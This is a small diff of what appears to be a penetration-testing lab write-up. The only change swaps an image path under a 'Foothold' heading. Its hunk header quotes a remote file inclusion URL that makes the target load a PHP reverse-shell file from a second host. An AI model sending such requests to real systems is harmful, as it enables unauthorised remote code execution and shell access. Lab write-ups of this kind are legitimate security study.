@@ -200,7 +200,7 @@ http://192.168.81.53:8080/site/index.php?page=http://192.168.49.81:4443/php-reve
 
 ### Foothold
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (8).png" alt=""><figcaption></figcaption></figure>
 
 ### PrivEsc vector
 
